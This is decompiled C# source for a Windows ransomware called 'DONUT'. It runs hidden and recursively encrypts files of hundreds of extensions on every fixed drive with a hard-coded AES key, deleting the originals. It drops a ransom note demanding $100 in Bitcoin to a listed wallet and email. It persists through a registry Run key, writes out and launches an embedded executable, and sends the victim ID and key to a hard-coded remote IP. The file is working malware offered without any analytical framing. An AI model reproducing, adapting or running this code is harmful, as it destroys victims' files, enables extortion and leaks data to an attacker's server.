using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace lulu_cry;

public class Form1 : Form
{
	public static string extensions_target = ".1cd,.3dm,.3ds,.3fr,.3g2,.3gp,.3pr,.7z,.7zip,.aac,.ab4,.abd,.acc,.accdb,.accde,.accdr,.accdt,.ach,.acr,.act,.adb,.adp,.ads,.agdl,.ai,.aiff,.ait,.al,.aoi,.apj,.apk,.arw,.ascx,.asf,.asm,.asp,.aspx,.asset,.asx,.atb,.avi,.awg,.back,.backup,.backupdb,.bak,.bank,.bay,.bdb,.bgt,.bik,.bin,.bkp,.blend,.bmp,.bpw,.bsa,.c,.cash,.cdb,.cdf,.cdr,.cdr3,.cdr4,.cdr5,.cdr6,.cdrw,.cdx,.ce1,.ce2,.cer,.cfg,.cfn,.cgm,.cib,.class,.cls,.cmt,.config,.contact,.cpi,.cpp,.cr2,.craw,.crt,.crw,.cry,.cs,.csh,.csl,.css,.csv,.d3dbsp,.dac,.das,.dat,.db,.db_journal,.db3,.dbf,.dbx,.dc2,.dcr,.dcs,.ddd,.ddoc,.ddrw,.dds,.def,.der,.des,.design,.dgc,.dgn,.dit,.djvu,.dng,.doc,.docm,.docx,.dot,.dotm,.dotx,.drf,.drw,.dtd,.dwg,.dxb,.dxf,.dxg,.edb,.eml,.eps,.erbsql,.erf,.exf,.fdb,.ffd,.fff,.fh,.fhd,.fla,.flac,.flb,.flf,.flv,.flvv,.forge,.fpx,.fxg,.gbr,.gho,.gif,.gray,.grey,.groups,.gry,.h,.hbk,.hdd,.hpp,.html,.ibank,.ibd,.ibz,.idx,.iif,.iiq,.incpas,.indd,.info,.info_,.ini,.iwi,.jar,.java,.jnt,.jpe,.jpeg,.jpg,.js,.json,.k2p,.kc2,.kdbx,.kdc,.key,.kpdx,.kwm,.laccdb,.lbf,.lck,.ldf,.lit,.litemod,.litesql,.lock,.log,.ltx,.lua,.m,.m2ts,.m3u,.m4a,.m4p,.m4v,.ma,.mab,.mapimail,.max,.mbx,.md,.mdb,.mdc,.mdf,.mef,.mfw,.mid,.mkv,.mlb,.mmw,.mny,.money,.moneywell,.mos,.mov,.mp3,.mp4,.mpeg,.mpg,.mrw,.msf,.msg,.myd,.nd,.ndd,.ndf,.nef,.nk2,.nop,.nrw,.ns2,.ns3,.ns4,.nsd,.nsf,.nsg,.nsh,.nvram,.nwb,.nx2,.nxl,.nyf,.oab,.obj,.odb,.odc,.odf,.odg,.odm,.odp,.ods,.odt,.ogg,.oil,.omg,.one,.orf,.ost,.otg,.oth,.otp,.ots,.ott,.p12,.p7b,.p7c,.pab,.pages,.pas,.pat,.pbf,.pcd,.pct,.pdb,.pdd,.pdf,.pef,.pem,.pfx,.php,.pif,.pl,.plc,.plus_muhd,.pm!,.pm,.pmi,.pmj,.pml,.pmm,.pmo,.pmr,.pnc,.pnd,.png,.pnx,.pot,.potm,.potx,.ppam,.pps,.ppsm,.ppsx,.ppt,.pptm,.pptx,.prf,.private,.ps,.psafe3,.psd,.pspimage,.pst,.ptx,.pub,.pwm,.py,.qba,.qbb,.qbm,.qbr,.qbw,.qbx,.qby,.qcow,.qcow2,.qed,.qtb,.r3d,.raf,.rar,.rat,.raw,.rdb,.re4,.rm,.rtf,.rvt,.rw2,.rwl,.rwz,.s3db,.safe,.sas7bdat,.sav,.save,.say,.sd0,.sda,.sdb,.sdf,.sh,.sldm,.sldx,.slm,.sql,.sqlite,.sqlite3,.sqlitedb,.sqlite-shm,.sqlite-wal,.sr2,.srb,.srf,.srs,.srt,.srw,.st4,.st5,.st6,.st7,.st8,.stc,.std,.sti,.stl,.stm,.stw,.stx,.svg,.swf,.sxc,.sxd,.sxg,.sxi,.sxm,.sxw,.tax,.tbb,.tbk,.tbn,.tex,.tga,.thm,.tif,.tiff,.tlg,.tlx,.txt,.upk,.usr,.vbox,.vdi,.vhd,.vhdx,.vmdk,.vmsd,.vmx,.vmxf,.vob,.vpd,.vsd,.wab,.wad,.wallet,.war,.wav,.wb2,.wma,.wmf,.wmv,.wpd,.wps,.x11,.x3f,.xis,.xla,.xlam,.xlk,.xlm,.xlr,.xls,.xlsb,.xlsm,.xlsx,.xlt,.xltm,.xltx,.xlw,.xml,.xps,.xxx,.ycbcra,.yuv,.zip";

	public static string[] stop_list_path = new string[10] { "\\ProgramData", "\\Program Files", "\\Program Files (x86)", "\\Windows", "\\All Users", "\\Local Settings", "\\AppData", "\\lulu", "\\$RECYCLE", "\\System Volume Information" };

	public static string[] stop_list_files = new string[8] { "desktop.ini", "autorun.inf", "ntuser.dat", "iconcache.db", "bootsect.bak", "boot.ini", "ntuser.dat.log", "thumbs.db" };

	public static string landingStr = "

	public static string string1 = "Hi.\n\rAll your files have been ENCRYPTED by DONUT Ransomware.\n\rDo you want to restore your files?\n\rYour should buy DonutDecryptor.\n\r";

	public static string string2 = "Current Price $100.\n\r";

	public static string string3 = "For payment your need cryptocurrency BitCoin.\n\rWrite to our email - donutmmm @tutanota.com\n\rand tell us your unique ID and BitCoin transaction.\n\r";

	public static string string4 = "Your Uniq ID is: " + AppDomain.CurrentDomain.FriendlyName + "\nBitCoin wallet is: 1MVB7wbeF1yLGRCUmVdgiDWMD7yRspJX8C";

	public static string decryptLandingStr = string3;

	public static string[] target_extensions = null;

	private static Rijndael rijndaelAlg;

	private static byte[] x1 = new byte[32]
	{
		213, 142, 67, 93, 55, 16, 117, 84, 91, 37,
		121, 212, 163, 4, 93, 6, 41, 22, 53, 74,
		125, 63, 75, 28, 79, 101, 141, 124, 18, 154,
		225, 214
	};

	private static byte[] y1 = new byte[16]
	{
		225, 201, 23, 144, 52, 67, 178, 45, 59, 31,
		113, 132, 103, 49, 125, 146
	};

	public static string landingPath = "c:\\TEMP\\donut.exe";

	public static string donut_key = "afkshdjfgawgefuyagusgf324jfhak";

	public static string donut_id = "unknown";

	public static int blockSize = 256;

	private IContainer components;

	public static void cryptInit()
	{
		rijndaelAlg = Rijndael.Create();
		rijndaelAlg.KeySize = 256;
		rijndaelAlg.BlockSize = 128;
		rijndaelAlg.Padding = PaddingMode.None;
		rijndaelAlg.Mode = CipherMode.CBC;
	}

	public static Exception insertData(string pc_id, string pc_key, string win_ver)
	{
		Exception result = null;
		try
		{
			string address = "http://88.99.48.80/donut/client.php";
			using WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("pc_id", pc_id);
			nameValueCollection.Add("pc_key", pc_key);
			nameValueCollection.Add("win_ver", win_ver);
			byte[] array = webClient.UploadValues(address, nameValueCollection);
			if (array.Length == 2)
			{
				return new Exception("ok");
			}
			Encoding.UTF8.GetString(array);
			return result;
		}
		catch (Exception result2)
		{
			return result2;
		}
	}

	public static void setKey(string key)
	{
		Encoding.GetEncoding(1251).GetBytes(key);
		int num = rijndaelAlg.KeySize / 8;
		for (int i = 0; i < num; i++)
		{
			x1[i] = (byte)key[i % key.Length];
		}
		rijndaelAlg.Key = x1;
	}

	private static void SetStartup(string path)
	{
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("donut.exe", path);
	}

	public Form1()
	{
		InitializeComponent();
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		cryptInit();
		LiveFileSysEncrypt();
		Process.Start(landingPath);
	}

	public static void GetDriveLetters(ref List<string> drives)
	{
		DriveInfo[] drives2 = DriveInfo.GetDrives();
		drives = new List<string>();
		DriveInfo[] array = drives2;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType == DriveType.Fixed)
			{
				drives.Add(driveInfo.RootDirectory.FullName);
			}
		}
	}

	public static Exception donutRenameFile(string fname)
	{
		Exception result = null;
		try
		{
			File.Move(fname, fname + ".donut");
			return result;
		}
		catch (Exception result2)
		{
			return result2;
		}
	}

	public static bool checkStopList(string path)
	{
		bool result = true;
		path.ToLower();
		int num = 0;
		while (true)
		{
			if (num < stop_list_files.Length)
			{
				if (path.ToLower().IndexOf(stop_list_files[num].ToLower()) > 0)
				{
					break;
				}
				num++;
				continue;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < stop_list_path.Length)
				{
					if (path.ToLower().IndexOf(stop_list_path[num2].ToLower()) > 0)
					{
						break;
					}
					num2++;
					continue;
				}
				return result;
			}
			return false;
		}
		return false;
	}

	private static void cryptFileThread(object obj)
	{
		try
		{
			string obj2 = (string)obj;
			enCrytp(obj2, obj2 + ".donut");
			File.Delete(obj2);
		}
		catch (Exception)
		{
		}
	}

	public static void cryptDrive(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			int num = 0;
			for (int i = 0; i < files.Length; i++)
			{
				if (checkStopList(files[i]))
				{
					string value = Path.GetExtension(files[i])!.ToLower();
					if (extensions_target.IndexOf(value) > 0)
					{
						num++;
						new Thread(cryptFileThread).Start(files[i]);
					}
				}
			}
			if (num > 0)
			{
				try
				{
					File.WriteAllText(Path.Combine(path, "decrypt.txt"), decryptLandingStr);
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(path);
			for (int j = 0; j < directories.Length; j++)
			{
				if (checkStopList(directories[j]))
				{
					cryptDrive(directories[j]);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void sendInfoThread()
	{
		try
		{
			string win_ver = Environment.OSVersion.Version.ToString();
			int num = 0;
			while (num < 10 && !(insertData(donut_id, donut_key, win_ver).Message == "ok"))
			{
				Thread.Sleep(1000);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void writeLanding()
	{
		byte[] bytes = Convert.FromBase64String(landingStr);
		File.WriteAllBytes(landingPath, bytes);
	}

	public static void LiveFileSysEncrypt()
	{
		try
		{
			List<string> drives = null;
			GetDriveLetters(ref drives);
			donut_key = GenerateCoupon(32, Guid.NewGuid().GetHashCode());
			donut_id = GenerateCoupon(32, Guid.NewGuid().GetHashCode());
			landingPath = Path.Combine(Path.GetTempPath(), donut_id.ToString() + ".exe");
			string4 = "Your Uniq ID is: " + donut_id + "\nBitCoin wallet is: 1MVB7wbeF1yLGRCUmVdgiDWMD7yRspJX8C";
			decryptLandingStr = string1 + string2 + string3 + string4;
			try
			{
				writeLanding();
			}
			catch (Exception)
			{
			}
			try
			{
				SetStartup(landingPath);
			}
			catch (Exception)
			{
			}
			new Thread(sendInfoThread).Start();
			setKey(donut_key);
			for (int i = 0; i < drives.Count; i++)
			{
				cryptDrive(drives[i]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string GenerateCoupon(int length, int seed)
	{
		Random random = new Random(seed);
		string text = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	public static void enCrytp(string sourceFName, string outFName)
	{
		int num = 0;
		BinaryWriter binaryWriter = new BinaryWriter(File.Open(outFName, FileMode.Create));
		BinaryReader binaryReader = new BinaryReader(File.Open(sourceFName, FileMode.Open));
		rijndaelAlg.Key = x1;
		rijndaelAlg.IV = y1;
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelAlg.CreateEncryptor(), CryptoStreamMode.Write);
		byte[] buffer = new byte[blockSize];
		while (binaryReader.BaseStream.Position < binaryReader.BaseStream.Length)
		{
			num = binaryReader.Read(buffer, 0, blockSize);
			cryptoStream.Write(buffer, 0, blockSize);
			byte[] buffer2 = memoryStream.ToArray();
			binaryWriter.Write(buffer2, 0, blockSize);
			memoryStream.Flush();
			cryptoStream.Flush();
			memoryStream.Seek(0L, SeekOrigin.Begin);
			if (num < blockSize)
			{
				break;
			}
		}
		binaryWriter.Write(Convert.ToByte(blockSize - num));
		cryptoStream.Close();
		binaryReader.Close();
		binaryWriter.Close();
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(12f, 25f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(168, 162));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}
}
